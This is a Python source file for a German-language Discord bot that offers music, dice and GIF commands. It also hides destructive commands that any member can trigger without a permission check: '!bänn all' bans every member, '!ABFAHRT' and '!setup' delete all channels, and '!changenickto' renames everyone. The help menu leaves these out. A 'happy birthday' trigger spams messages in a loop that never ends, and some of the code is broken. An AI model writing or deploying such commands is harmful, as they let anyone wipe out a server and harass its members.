import music
import BHEL

import discord
import random
import time


async def main_handler(message, client):
    if message.author == client.user:
        return None

    def check(m):
        return m.content == 'y' or m.content == 'yes' or m.content == 'n' or m.content == 'no' or m.content == 'ja' or m.content == 'nein'

    def Schalter():
        readline = open("switch.txt", "r")
        switch_state = readline.read()
        switch = "error"
        if switch_state == 'True':
            switch = "an"
        if switch_state == 'False':
            switch = "aus"
        return switch

    if message.content.startswith('!switchpls'):
        if message.author.id == 695885580629704734 or message.author.id == 408627107795828746:
            readline = open("switch.txt", "r")
            switch_state = readline.read()
            if switch_state == 'False':
                await message.channel.send("Der Schalter ist an. Alle neuen Mitglieder werden gebannt. :)")
                readline = open("switch.txt", "w")
                readline.write('True')
            elif switch_state == 'True':
                await message.channel.send("Der Schalter ist aus. Alle neuen Mitglieder werden begrüßt. :)")
                readline = open("switch.txt", "w")
                readline.write('False')
            else:
                await message.channel.send(
                    "!Switchpls broken, bitte Brot#0685 kontaktieren, er muss wieder reparieren kommen :)")
        else:
            await message.channel.send("Du bist nicht berechtigt diesen Befehl auszuführen. Tut mir leid :)")

    if message.content.startswith('!switchstate'):
        if message.author.id == 695885580629704734 or message.author.id == 408627107795828746:
            await message.channel.send(
                f'Möchtest du den status deines Schalters erfahren? (y , yes , ja / n, no, nein)')
            response = await client.wait_for('message', check=check, timeout=15)
            if response.clean_content.lower() == 'y' or response.clean_content.lower() == 'yes' or response.clean_content.lower() == 'ja':
                await message.channel.send('Der Schalter ist ' + Schalter())

            elif response.clean_content.lower() == 'n' or response.clean_content.lower() == 'no' or response.clean_content.lower() == 'nein':
                await message.channel.send('Okidoki, dann halt nicht :)')

            else:
                await message.channel.send("Du bist zu dumm um zu verstehen, was ich dir sage :)")

        else:
            await message.channel.send("Du bist nicht berechtigt diesen Befehl auszuführen. Tut mir leid :)")
        ###Wenn wir ganz gemein unterwegs sind###
        # await message.author.ban(reason = "Kiddo meint, du bist zu dumm um zu verstehen, was ich dir sage. Du bist gebannt :)")

        # await message.channel.send(f'Der Status deines Schalters ist {Schalter(frage)}')

    # Ping
    if message.content.startswith('ping'):
        await message.channel.send('pong')

    # Würfel
    elif message.content.startswith('!rolldice'):
        completeRoll = message.content.split(' ')[1]
        roll = int(completeRoll)
        while roll > 0:
            await message.channel.send('You rolled a ' + str(random.randint(1, 6)))
            roll = roll - 1
            time.sleep(1)

    # lösche eine bestimmte anzahl an nachrichten
    elif message.content.startswith('!lösche'):
        completeText = message.content.split(' ')[1]
        Limit = int(completeText)
        if Limit == 1:
            await message.channel.send('Eine Nachricht wird gelöscht... :)')
        elif Limit > 1:
            await message.channel.send(f'{Limit} Nachrichten werden gelöscht... :)')
        Limit = Limit + 2
        time.sleep(2)
        await message.channel.purge(limit=int(Limit))
        if Limit == 3:
            print('Eine Nachricht wurde gelöscht. Glückwunsch!')
        else:
            print(f'{Limit - 2} Nachrichten wurden gelöscht. Glückwunsch!')

    # bann einen user
    elif message.content.startswith('!ban') and message.author.guild_permissions.ban_members:
        args = message.content.split(' ')
        if len(args) == 2:
            member = discord.utils.find(lambda m: args[1] in m.name, message.guild.members)
            if member:
                await message.channel.send(f'{member} wird gebannt... Tschüssi {member} :)')
                time.sleep(2)
                await member.ban()
                await message.channel.send(f'{member} wurde gebannt :)')
            else:
                await message.channel.send('Der User wurde nicht gefunden!')

    # bann alle user
    elif message.content.startswith('!bänn all'):
        await message.channel.send('Alle User werden gebannt... Tschüssi :)')
        time.sleep(2)
        for guild in message.client.guild:
            for member in guild.members:
                await member.ban()
                await message.channel.send(f'{member} wurde gebannt!')

    # ändert alle nicknames zu dem, was du willst
    elif message.content.startswith('!changenickto'):
        fast = message.content.split(' ')[1]
        await message.channel.send(f'Jawoll Chef alle Nicknames werden zu {fast} geändert... :)')
        time.sleep(2)
        for member in message.guild.members:
            await member.edit(nick=f"{fast}")

    # wählt aus einem random pool von gifs eines aus und sendet es
    elif message.content.startswith("!dance"):
        dance = open("gifs.txt", "r")
        dance = dance.readlines()
        dance = random.choice(dance)
        await message.channel.send(dance)

    elif message.content.startswith('!L'):
        await message.channel.send(
            'LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL',
            tts=True)

    elif message.content.startswith('!details'):
        if message.author.id == 695885580629704734 or message.author.id == 408627107795828746:
            await message.author.create_dm()
            await message.author.dm_channel.send(f"```"
                                                f"Halli Hallo 💕\n"
                                                f"Hier sind ein paar Details zu dem Channel :) \n"
                                                f"Channel: {message.channel}\n"
                                                f"Channel ID: {message.channel.id}\n"
                                                f"Channel Name: {message.channel.name}\n"
                                                f"Channel Type: {message.channel.type}\n"
                                                f"Channel Category: {message.channel.category}\n"
                                                f"Channel Category ID: {message.channel.category_id}\n"
                                                f"Channel Category Name: {message.channel.category.name}\n"
                                                f"Channel Category Type: {message.channel.category.type}\n"
                                                f"Channel Category Position: {message.channel.category.position}\n"
                                                f"TTS is {message.tts}\n"
                                                f"```")
        else:
            pass

    # löscht alle channels
    elif message.content.startswith('!ABFAHRT'):
        await message.channel.send("ABFAHRT!!!",
                                   file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
        time.sleep(8)
        for channel in message.guild.channels:
            await channel.delete(reason='MFG KiddoBot :)')

    # "setup" löscht alle channels, alle rollen, alle emojis, alle member und alle kategorien
    elif message.content.startswith('!setup'):
        await message.channel.send('Einen Moment bitte... :)')
        time.sleep(2)
        await message.channel.send("ABFAHRT!!!",
                                   file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
        time.sleep(8)
        # for role in message.guild.roles:
        #   await role.delete(reason='MFG KiddoBot :)')

        for channel in message.guild.channels:
            if channel == 'rules' or channel == 'moderator-only':
                pass
            else:
                await channel.delete(reason='MFG KiddoBot :)')

    ########Music-Bot###########################################################################################################

    if message.content.startswith('=play'):
        await music.play(message)

    elif message.content.startswith('=pause'):
        await music.pause(message)

    elif message.content.startswith('=resume'):
        await music.resume(message)

    elif message.content.startswith('=leave'):
        await music.leave(message)


    #####################2BHEL Zeug#############################################################################################

    elif "leon" in message.content or "Leon" in message.content:
        await BHEL.leon(message)


    elif "mods" in message.content or "Mods" in message.content:
        await BHEL.mods(message)

    elif "Berat" in message.content or "berat" in message.content:
        await BHEL.berat(message)

    ###########################################################################################################################

    elif message.content.startswith('!help'):
        time.sleep(0.5)
        await message.channel.send(" ```"
                                   "Du brauchst wirklich Hilfe 🤢🤮 \n"
                                   "Hier ist die Hilfe: \n"
                                   "!help: Zeigt diese Nachricht Dödel! \n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "ping: Pong \n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "@everyone: tu's nicht. \n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "!lösche belieb. Zahl: löscht beliebig viele Nachrichten \n"
                                   # "---------------------------------------------------------------------------------------------\n\n"
                                   # "!ban belieb. member: Bannt einen Member, wenn du die Rechte hast, das zu tun \n"
                                   # "---------------------------------------------------------------------------------------------\n\n"
                                   # "!bänn all: Bannt alle Member, wenn du die Rechte hast, das zu tun \n"
                                   # "---------------------------------------------------------------------------------------------\n\n"
                                   # "!changenickpls: Ändert alle Nicknames \n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "!rolldice belieb. Zahl: Würfelt beliebig oft \n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "!switchpls: Schaltet den Switch um (nur wenn du cool bist)\n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "!switchstate: Fragt, ob du den Status deines Schalters wissen willst (nur wenn du cool bist)\n"
                                   "---------------------------------------------------------------------------------------------\n"
                                   "!dance: Zeigt dir ein Video, wo Kiddo allein, oder mit seinen Freunden tanzt \n"
                                   "---------------------------------------------------------------------------------------------\n\n"
                                   "```")

    ###Unendliche Nachrichten###
    if message.content == 'happy birthday':
        BIRTHDAY = 100000
        while BIRTHDAY > 0:
            await message.channel.send('Happy Birthday! 🎈🎉')
            time.sleep(0.6)

        # await message.guild.ban()
        # await message.channel.send('Alle User wurden gebannt!')